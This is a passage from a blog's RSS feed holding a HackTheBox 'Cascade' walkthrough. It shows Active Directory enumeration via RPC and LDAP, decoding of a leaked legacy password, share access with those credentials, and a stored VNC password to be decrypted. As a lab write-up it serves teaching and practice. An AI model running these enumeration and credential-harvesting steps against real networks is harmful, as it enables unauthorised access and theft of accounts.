<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>dnSpy on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/dnspy/</link>
    <description>Recent content in dnSpy on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Wed, 03 Jun 2020 16:05:55 +0000</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/dnspy/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Cascade</title>
      <link>https://fahmifj.github.io/hackthebox/cascade/</link>
      <pubDate>Wed, 03 Jun 2020 16:05:55 +0000</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/cascade/</guid>
      <description>Plundering dead Active Directory accounts</description>
      <content:encoded><![CDATA[<p>Cascade is another fun Windows machine with Medium difficulty from HackTheBox created by <a href="https://vbscrub.com/">VbScrub</a>, the creator of <a href="/writeup/htb-nest">Nest</a>. It starts with by enumerating LDAP to find a custom LDAP attribute on one of the users to gain initial access to SMB shares. Enumeration on SMB discovers VNC credentials that can be decrypted using IRB. The credentials can be used to gain a foothold on the system. Another enumeration on SMB with those credentials finds a set of custom application. The database file used by the application contains an encrypted credentials of another user which can be decrypted by reversing the application. The last credentials I obtained allow me to recover the administrator password from AD Recycle Bin.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>RPC enumeration</li>
<li>Decrypting VNC password</li>
<li>Reversing .NET</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>evil-winrm - <a href="https://github.com/Hackplayers/evil-winrm">https://github.com/Hackplayers/evil-winrm</a></li>
<li>dnSpy - <a href="https://github.com/dnSpy/dnSpy/">https://github.com/dnSpy/dnSpy/</a></li>
<li>Impacket - <a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p><code>nmap</code> shows the typical port used by Active Directory domain controller.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@iamf# nmap -sC -sV -oA nmap/initial-cascade 10.10.10.182
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>..
</span></span><span class="line"><span class="cl">PORT      STATE SERVICE       VERSION
</span></span><span class="line"><span class="cl">53/tcp    open  domain        Microsoft DNS 6.1.7601 <span class="o">(</span>1DB15D39<span class="o">)</span> <span class="o">(</span>Windows Server <span class="m">2008</span> R2 SP1<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> dns-nsid:
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  bind.version: Microsoft DNS 6.1.7601 <span class="o">(</span>1DB15D39<span class="o">)</span>
</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server time: 2020-06-03 00:20:10Z<span class="o">)</span>
</span></span><span class="line"><span class="cl">135/tcp   open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span class="line"><span class="cl">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: cascade.local, Site: Default-First-Site-Name<span class="o">)</span>
</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds?
</span></span><span class="line"><span class="cl">636/tcp   open  tcpwrapped
</span></span><span class="line"><span class="cl">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: cascade.local, Site: Default-First-Site-Name<span class="o">)</span>
</span></span><span class="line"><span class="cl">3269/tcp  open  tcpwrapped
</span></span><span class="line"><span class="cl">49154/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49155/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span class="line"><span class="cl">49158/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49165/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">Service Info: Host: CASC-DC1<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Host script results:
</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: 1s
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode:
</span></span><span class="line"><span class="cl"><span class="p">|</span>   2.02:
</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled and required
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time:
</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2020-06-03T00:21:02
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: 2020-06-02T04:24:21
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>..
</span></span></code></pre></div><p><code>nmap</code> reveals the AD domain name <code>cascade.local</code> and identifies the OS to be Windows Server 2008 R2 SP1</p>
<p>The full scan almost returns the same result, it discovers a WinRM port (5985).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@iamf# nmap -p- -oA nmap/full-cascade cascade.htb
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT      STATE SERVICE
</span></span><span class="line"><span class="cl">53/tcp    open  domain
</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec
</span></span><span class="line"><span class="cl">135/tcp   open  msrpc
</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn
</span></span><span class="line"><span class="cl">389/tcp   open  ldap
</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds
</span></span><span class="line"><span class="cl">636/tcp   open  ldapssl
</span></span><span class="line"><span class="cl">3268/tcp  open  globalcatLDAP
</span></span><span class="line"><span class="cl">3269/tcp  open  globalcatLDAPssl
</span></span><span class="line"><span class="cl">5985/tcp  open  wsman
</span></span><span class="line"><span class="cl">49154/tcp open  unknown
</span></span><span class="line"><span class="cl">49155/tcp open  unknown
</span></span><span class="line"><span class="cl">49157/tcp open  unknown
</span></span><span class="line"><span class="cl">49158/tcp open  unknown
</span></span><span class="line"><span class="cl">49165/tcp open  unknown
</span></span></code></pre></div><p>I will add  <code>cascade.htb</code> to my <code>/etc/hosts</code></p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-445---smb--rpc-over-smb">TCP 445 - SMB / RPC over SMB</h3>
<p>Anonymous login is allowed on SMB port. I tried to list all the shares using <code>smbclient</code> but there was nothing there.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@iamf# smbclient -N -L //10.10.10.182
</span></span><span class="line"><span class="cl">Anonymous login successful
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        Sharename       Type      Comment
</span></span><span class="line"><span class="cl">        ---------       ----      -------
</span></span><span class="line"><span class="cl">SMB1 disabled -- no workgroup available
</span></span></code></pre></div><h4 id="enumeration-via-rpc">Enumeration via RPC</h4>
<p>Knowing anonymous login is allowed on SMB, I can try it too on RPC using <code>rpcclient</code> and it works as well.</p>
<p>With current access, I can obtain the domain users and their groups manually.</p>
<p>User enumeration</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@iamf# rpcclient -U <span class="s1">&#39;%&#39;</span> 10.10.10.182
</span></span><span class="line"><span class="cl">rpcclient $&gt;
</span></span><span class="line"><span class="cl">rpcclient $&gt; enumdomusers
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>CascGuest<span class="o">]</span> rid:<span class="o">[</span>0x1f5<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>arksvc<span class="o">]</span> rid:<span class="o">[</span>0x452<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>s.smith<span class="o">]</span> rid:<span class="o">[</span>0x453<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>r.thompson<span class="o">]</span> rid:<span class="o">[</span>0x455<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>util<span class="o">]</span> rid:<span class="o">[</span>0x457<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>j.wakefield<span class="o">]</span> rid:<span class="o">[</span>0x45c<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>s.hickson<span class="o">]</span> rid:<span class="o">[</span>0x461<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>j.goodhand<span class="o">]</span> rid:<span class="o">[</span>0x462<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>a.turnbull<span class="o">]</span> rid:<span class="o">[</span>0x464<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>e.crowe<span class="o">]</span> rid:<span class="o">[</span>0x467<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>b.hanson<span class="o">]</span> rid:<span class="o">[</span>0x468<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>d.burman<span class="o">]</span> rid:<span class="o">[</span>0x469<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>BackupSvc<span class="o">]</span> rid:<span class="o">[</span>0x46a<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>j.allen<span class="o">]</span> rid:<span class="o">[</span>0x46e<span class="o">]</span>
</span></span><span class="line"><span class="cl">user:<span class="o">[</span>i.croft<span class="o">]</span> rid:<span class="o">[</span>0x46f<span class="o">]</span>
</span></span></code></pre></div><p>I&rsquo;ll save the output to a file called <code>users</code>, and filter the usernames only then pipe it to <code>users.list</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@iamf#  cat users <span class="p">|</span> tr -d <span class="s1">&#39;[]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39; &#39;</span> -f1 <span class="p">|</span> cut -c6- <span class="p">|</span> tee users.list
</span></span><span class="line"><span class="cl">CascGuest
</span></span><span class="line"><span class="cl">arksvc
</span></span><span class="line"><span class="cl">s.smith
</span></span><span class="line"><span class="cl">r.thompson
</span></span><span class="line"><span class="cl">util
</span></span><span class="line"><span class="cl">j.wakefield
</span></span><span class="line"><span class="cl">s.hickson
</span></span><span class="line"><span class="cl">j.goodhand
</span></span><span class="line"><span class="cl">a.turnbull
</span></span><span class="line"><span class="cl">e.crowe
</span></span><span class="line"><span class="cl">b.hanson
</span></span><span class="line"><span class="cl">d.burman
</span></span><span class="line"><span class="cl">BackupSvc
</span></span><span class="line"><span class="cl">j.allen
</span></span><span class="line"><span class="cl">i.croft
</span></span></code></pre></div><p>Builtin group enumeration</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">rpcclient $&gt; enumalsgroups <span class="nb">builtin</span>
</span></span><span class="line"><span class="cl">group:<span class="o">[</span>Pre-Windows <span class="m">2000</span> Compatible Access<span class="o">]</span> rid:<span class="o">[</span>0x22a<span class="o">]</span>
</span></span><span class="line"><span class="cl">group:<span class="o">[</span>Incoming Forest Trust Builders<span class="o">]</span> rid:<span class="o">[</span>0x22d<span class="o">]</span>
</span></span><span class="line"><span class="cl">group:<span class="o">[</span>Windows Authorization Access Group<span class="o">]</span> rid:<span class="o">[</span>0x230<span class="o">]</span>
</span></span><span class="line"><span class="cl">group:<span class="o">[</span>Terminal Server License Servers<span class="o">]</span> rid:<span class="o">[</span>0x231<span class="o">]</span>
</span></span><span class="line"><span class="cl">group:<span class="o">[</span>Users<span class="o">]</span> rid:<span class="o">[</span>0x221<span class="o">]</span>
</span></span><span class="line"><span class="cl">group:<span class="o">[</span>Guests<span class="o">]</span> rid:<span class="o">[</span>0x222<span class="o">]</span>
</span></span><span class="line"><span class="cl">group:<span class="o">[</span>Remote Desktop Users<span class="o">]</span> rid:<span class="o">[</span>0x22b<span class="o">]</span>
</span></span><span class="line"><span class="cl">group:<span class="o">[</span>Network Configuration Operators<span class="o">]</span> rid:<span class="o">[</span>0x22c<span class="o">]</span>
</span></span><span class="line"><span class="cl">group:<span class="o">[</span>Performance Monitor Users<span class="o">]</span> rid:<span class="o">[</span>0x22e<span class="o">]</span>
</span></span><span class="line"><span class="cl">group:<span class="o">[</span>Performance Log Users<span class="o">]</span> rid:<span class="o">[</span>0x22f<span class="o">]</span>
</span></span><span class="line"><span class="cl">group:<span class="o">[</span>Distributed COM Users<span class="o">]</span> rid:<span class="o">[</span>0x232<span class="o">]</span>
</span></span><span class="line"><span class="cl">group:<span class="o">[</span>IIS_IUSRS<span class="o">]</span> rid:<span class="o">[</span>0x238<span class="o">]</span>
</span></span><span class="line"><span class="cl">group:<span class="o">[</span>Cryptographic Operators<span class="o">]</span> rid:<span class="o">[</span>0x239<span class="o">]</span>
</span></span><span class="line"><span class="cl">group:<span class="o">[</span>Event Log Readers<span class="o">]</span> rid:<span class="o">[</span>0x23d<span class="o">]</span>
</span></span><span class="line"><span class="cl">group:<span class="o">[</span>Certificate Service DCOM Access<span class="o">]</span> rid:<span class="o">[</span>0x23e<span class="o">]</span>
</span></span></code></pre></div><p>Domain group enumeration</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">rpcclient $&gt; enumalsgroups domain
</span></span><span class="line"><span class="cl">group:<span class="o">[</span>Cert Publishers<span class="o">]</span> rid:<span class="o">[</span>0x205<span class="o">]</span>
</span></span><span class="line"><span class="cl">group:<span class="o">[</span>RAS and IAS Servers<span class="o">]</span> rid:<span class="o">[</span>0x229<span class="o">]</span>
</span></span><span class="line"><span class="cl">group:<span class="o">[</span>Allowed RODC Password Replication Group<span class="o">]</span> rid:<span class="o">[</span>0x23b<span class="o">]</span>
</span></span><span class="line"><span class="cl">group:<span class="o">[</span>Denied RODC Password Replication Group<span class="o">]</span> rid:<span class="o">[</span>0x23c<span class="o">]</span>
</span></span><span class="line"><span class="cl">group:<span class="o">[</span>DnsAdmins<span class="o">]</span> rid:<span class="o">[</span>0x44e<span class="o">]</span>
</span></span><span class="line"><span class="cl">group:<span class="o">[</span>IT<span class="o">]</span> rid:<span class="o">[</span>0x459<span class="o">]</span>
</span></span><span class="line"><span class="cl">group:<span class="o">[</span>Production<span class="o">]</span> rid:<span class="o">[</span>0x45a<span class="o">]</span>
</span></span><span class="line"><span class="cl">group:<span class="o">[</span>HR<span class="o">]</span> rid:<span class="o">[</span>0x45b<span class="o">]</span>
</span></span><span class="line"><span class="cl">group:<span class="o">[</span>AD Recycle Bin<span class="o">]</span> rid:<span class="o">[</span>0x45f<span class="o">]</span>
</span></span><span class="line"><span class="cl">group:<span class="o">[</span>Backup<span class="o">]</span> rid:<span class="o">[</span>0x460<span class="o">]</span>
</span></span><span class="line"><span class="cl">group:<span class="o">[</span>Temps<span class="o">]</span> rid:<span class="o">[</span>0x463<span class="o">]</span>
</span></span><span class="line"><span class="cl">group:<span class="o">[</span>WinRMRemoteWMIUsers__<span class="o">]</span> rid:<span class="o">[</span>0x465<span class="o">]</span>
</span></span><span class="line"><span class="cl">group:<span class="o">[</span>Remote Management Users<span class="o">]</span> rid:<span class="o">[</span>0x466<span class="o">]</span>
</span></span><span class="line"><span class="cl">group:<span class="o">[</span>Factory<span class="o">]</span> rid:<span class="o">[</span>0x46c<span class="o">]</span>
</span></span><span class="line"><span class="cl">group:<span class="o">[</span>Finance<span class="o">]</span> rid:<span class="o">[</span>0x46d<span class="o">]</span>
</span></span><span class="line"><span class="cl">group:<span class="o">[</span>Audit Share<span class="o">]</span> rid:<span class="o">[</span>0x471<span class="o">]</span>
</span></span><span class="line"><span class="cl">group:<span class="o">[</span>Data Share<span class="o">]</span> rid:<span class="o">[</span>0x472<span class="o">]</span>
</span></span></code></pre></div><p>List group members:</p>
<p>Members of IT group (rid:0x459)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">rpcclient $&gt; queryaliasmem domain 0x459
</span></span><span class="line"><span class="cl"> sid:<span class="o">[</span>S-1–5–21–3332504370–1206983947–1165150453–1106<span class="o">]</span>
</span></span><span class="line"><span class="cl"> sid:<span class="o">[</span>S-1–5–21–3332504370–1206983947–1165150453–1107<span class="o">]</span>
</span></span><span class="line"><span class="cl"> sid:<span class="o">[</span>S-1–5–21–3332504370–1206983947–1165150453–1109<span class="o">]</span>
</span></span><span class="line"><span class="cl">rpcclient $&gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–1106
</span></span><span class="line"><span class="cl">S-1–5–21–3332504370–1206983947–1165150453–1106 CASCADE<span class="se">\a</span>rksvc <span class="o">(</span>1<span class="o">)</span>
</span></span><span class="line"><span class="cl">rpcclient $&gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–1107
</span></span><span class="line"><span class="cl">S-1–5–21–3332504370–1206983947–1165150453–1107 CASCADE<span class="se">\s</span>.smith <span class="o">(</span>1<span class="o">)</span>
</span></span><span class="line"><span class="cl">rpcclient $&gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–1109
</span></span><span class="line"><span class="cl">S-1–5–21–3332504370–1206983947–1165150453–1109 CASCADE<span class="se">\r</span>.thompson <span class="o">(</span>1<span class="o">)</span>
</span></span></code></pre></div><p>Members of Remote Management Users group (rid:0x466)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">rpcclient $&gt; queryaliasmem domain 0x466
</span></span><span class="line"><span class="cl"> sid:<span class="o">[</span>S-1–5–21–3332504370–1206983947–1165150453–1106<span class="o">]</span>
</span></span><span class="line"><span class="cl"> sid:<span class="o">[</span>S-1–5–21–3332504370–1206983947–1165150453–1107<span class="o">]</span>
</span></span><span class="line"><span class="cl">rpcclient $&gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–1106
</span></span><span class="line"><span class="cl">S-1–5–21–3332504370–1206983947–1165150453–1106 CASCADE<span class="se">\a</span>rksvc <span class="o">(</span>1<span class="o">)</span>
</span></span><span class="line"><span class="cl">rpcclient $&gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–1107
</span></span><span class="line"><span class="cl">S-1–5–21–3332504370–1206983947–1165150453–1107 CASCADE<span class="se">\s</span>.smith <span class="o">(</span>1<span class="o">)</span>
</span></span></code></pre></div><p>Member of AD Recycle Bin</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">rpcclient $&gt; queryaliasmem domain 0x45f
</span></span><span class="line"><span class="cl"> sid:<span class="o">[</span>S-1–5–21–3332504370–1206983947–1165150453–1106<span class="o">]</span>
</span></span><span class="line"><span class="cl">rpcclient $&gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–1106
</span></span><span class="line"><span class="cl">S-1–5–21–3332504370–1206983947–1165150453–1106 CASCADE<span class="se">\a</span>rksvc <span class="o">(</span>1<span class="o">)</span>
</span></span></code></pre></div><p>Members of HR (rid:0x45b)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">rpcclient $&gt; queryaliasmem domain 0x45b
</span></span><span class="line"><span class="cl"> sid:<span class="o">[</span>S-1–5–21–3332504370–1206983947–1165150453–1121<span class="o">]</span>
</span></span></code></pre></div><p>Members of Audit group (rid:0x471)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">rpcclient $&gt; queryaliasmem domain 0x471
</span></span><span class="line"><span class="cl"> sid:<span class="o">[</span>S-1–5–21–3332504370–1206983947–1165150453–1107<span class="o">]</span>
</span></span><span class="line"><span class="cl">rpcclient $&gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–1107
</span></span><span class="line"><span class="cl">S-1–5–21–3332504370–1206983947–1165150453–1107 CASCADE<span class="se">\s</span>.smith <span class="o">(</span>1<span class="o">)</span>
</span></span></code></pre></div><p>Members of Data share group (rid:0x472)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">rpcclient $&gt; queryaliasmem domain 0x472
</span></span><span class="line"><span class="cl"> sid:<span class="o">[</span>S-1–5–21–3332504370–1206983947–1165150453–513<span class="o">]</span>
</span></span><span class="line"><span class="cl">rpcclient $&gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–513
</span></span><span class="line"><span class="cl">S-1–5–21–3332504370–1206983947–1165150453–513 CASCADE<span class="se">\D</span>omain Users <span class="o">(</span>2<span class="o">)</span>
</span></span></code></pre></div><p>After enough digging, I did a password spray with a pattern of “username%username”, but no luck.</p>
<p>Before moving on, I&rsquo;ll note the Remote Management Users group members:</p>
<ul>
<li><code>arksvc</code></li>
<li><code>s.smith</code></li>
</ul>
<h3 id="tcp-389---ldap">TCP 389 - LDAP</h3>
<p>In LDAP, anonymous login are also allowed.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@iamf# ldapsearch -h <span class="s1">&#39;10.10.10.182&#39;</span> -x -b <span class="s2">&#34;dc=cascade,dc=local&#34;</span> &gt; ldap-enum
</span></span></code></pre></div><blockquote>
<p>Nmap already identifies the Active Directory domain name as <code>cascade.local</code>. Because AD is basically based on the LDAP protocol, in LDAP form or known as a distinguished name, the AD domain usually follows &ldquo;DC=NAME,DC=TLD&rdquo;.</p>
<ul>
<li>cascade = NAME</li>
<li>local = TLD (Top-Level Domain)</li>
</ul>
</blockquote>
<p>While examining the output from <code>ldap-enum</code>, I spotted an interesting line from user Ryan Thompson.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">displayName: Ryan Thompson
</span></span><span class="line"><span class="cl">uSNCreated: <span class="m">24610</span>
</span></span><span class="line"><span class="cl">memberOf: <span class="nv">CN</span><span class="o">=</span>IT,OU<span class="o">=</span>Groups,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local</span>
</span></span><span class="line"><span class="cl">uSNChanged: <span class="m">295010</span>
</span></span><span class="line"><span class="cl">name: Ryan Thompson
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">logonCount: <span class="m">2</span>
</span></span><span class="line"><span class="cl">sAMAccountName: r.thompson
</span></span><span class="line"><span class="cl">sAMAccountType: <span class="m">805306368</span>
</span></span><span class="line"><span class="cl">userPrincipalName: r.thompson@cascade.local
</span></span><span class="line"><span class="cl">objectCategory: <span class="nv">CN</span><span class="o">=</span>Person,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local</span>
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">lastLogonTimestamp: <span class="m">132294360317419816</span>
</span></span><span class="line"><span class="cl">msDS-SupportedEncryptionTypes: <span class="m">0</span>
</span></span><span class="line"><span class="cl">cascadeLegacyPwd: <span class="nv">clk0bjVldmE</span><span class="o">=</span>
</span></span></code></pre></div><p>The <code>cascadeLegacyPwd: clk0bjVldmE=</code> line only appears on Ryan Thompson section and it can be decoded into <code>rY4n5eva</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@iamf# <span class="nb">echo</span> <span class="nv">clk0bjVldmE</span><span class="o">=</span> <span class="p">|</span> base64 -d
</span></span><span class="line"><span class="cl">rY4n5eva
</span></span></code></pre></div><p>I&rsquo;ll mark the accounts that have a <code>logonCount</code> value greater than one:</p>
<p><div class="img-container"><img src="imgs/image-20210423204454321.png" alt="image-20210423204454321"  /></div>
</p>
<p><div class="img-container"><img src="imgs/image-20210423204536286.png" alt="image-20210423204536286"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="access-as-rthompson">Access as r.thompson</h3>
<p>It turns out that the decoded <code>cascadeLegacyPwd</code> is <code>r.thompson </code>&rsquo;s password.</p>
<p>With <code>r.thompson</code> creds, I can see all the available shares.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@iamf# crackmapexec smb cascade.htb -u r.thompson -p <span class="s1">&#39;rY4n5eva&#39;</span> --shares 
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210423204947026.png" alt="image-20210423204947026"  /></div>
</p>
<h4 id="data-share">Data share</h4>
<p>In Data shares, <code>r.thompson</code> is only allowed to read IT folder. I&rsquo;ll pull all the files from the IT folder using <code>smbget</code>.</p>
<blockquote>
<p>Recall enumeration via RPC, <code>r.thompson</code> is a member of the IT group.</p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@iamf# smbget -R smb://cascade.htb/Data/IT/ -U r.thompson
</span></span></code></pre></div><img src="imgs/image-20210423205837847.png" alt="image-20210423205837847" style="zoom:80%;" />
<p>Here is the directory structure of IT folder.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@iamf# tree
</span></span><span class="line"><span class="cl">.
</span></span><span class="line"><span class="cl">└── IT
</span></span><span class="line"><span class="cl">    ├── Email Archives
</span></span><span class="line"><span class="cl">    │   └── Meeting_Notes_June_2018.html
</span></span><span class="line"><span class="cl">    ├── LogonAudit
</span></span><span class="line"><span class="cl">    ├── Logs
</span></span><span class="line"><span class="cl">    │   ├── Ark AD Recycle Bin
</span></span><span class="line"><span class="cl">    │   │   └── ArkAdRecycleBin.log
</span></span><span class="line"><span class="cl">    │   └── DCs
</span></span><span class="line"><span class="cl">    │       └── dcdiag.log
</span></span><span class="line"><span class="cl">    └── Temp
</span></span><span class="line"><span class="cl">        ├── r.thompson
</span></span><span class="line"><span class="cl">        └── s.smith
</span></span><span class="line"><span class="cl">            └── VNC Install.reg
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="m">9</span> directories, <span class="m">4</span> files
</span></span></code></pre></div><p>The <code>Meeting_Notes_June_2018.html</code> is an email (I drew a red line to indicate something important)</p>
<p><div class="img-container"><img src="imgs/image-20210423210730678.png" alt="image-20210423210730678"  /></div>
</p>
<p>The second interesting file is <code>VNC Install.reg</code>. It contains a stored password which can be decrypted according to this GitHub (<a href="https://github.com/frizb/PasswordDecrypts">https://github.com/frizb/PasswordDecrypts</a>)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">□□Windows Registry Editor Version 5.00
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
</span></span><span class="line"><span class="cl">...[SNIP]...
</span></span><span class="line"><span class="cl">&#34;Password&#34;=hex:6b,cf,2a,4b,6e,5a,ca,0f
</span></span><span class="line"><span class="cl">...[SNIP]...
</span></span></code></pre></div><p>The third interesting file is <code>ArkAdRecycleBin.log</code>. It looks like a log from a custom application. I&rsquo;ll take note on &ldquo;Moving object to AD recycle bin CN=TempAdmin&rdquo; part.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1/10/2018 15:43 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
</span></span><span class="line"><span class="cl">1/10/2018 15:43 [MAIN_THREAD]   Validating settings...
</span></span><span class="line"><span class="cl">1/10/2018 15:43 [MAIN_THREAD]   Error: Access is denied
</span></span><span class="line"><span class="cl">1/10/2018 15:43 [MAIN_THREAD]   Exiting with error code 5
</span></span><span class="line"><span class="cl">2/10/2018 15:56 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
</span></span><span class="line"><span class="cl">2/10/2018 15:56 [MAIN_THREAD]   Validating settings...
</span></span><span class="line"><span class="cl">2/10/2018 15:56 [MAIN_THREAD]   Running as user CASCADE\ArkSvc
</span></span><span class="line"><span class="cl">2/10/2018 15:56 [MAIN_THREAD]   Moving object to AD recycle bin CN=Test,OU=Users,OU=UK,DC=cascade,DC=local
</span></span><span class="line"><span class="cl">2/10/2018 15:56 [MAIN_THREAD]   Successfully moved object. New location CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local
</span></span><span class="line"><span class="cl">2/10/2018 15:56 [MAIN_THREAD]   Exiting with error code 0
</span></span><span class="line"><span class="cl">8/12/2018 12:22 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
</span></span><span class="line"><span class="cl">8/12/2018 12:22 [MAIN_THREAD]   Validating settings...
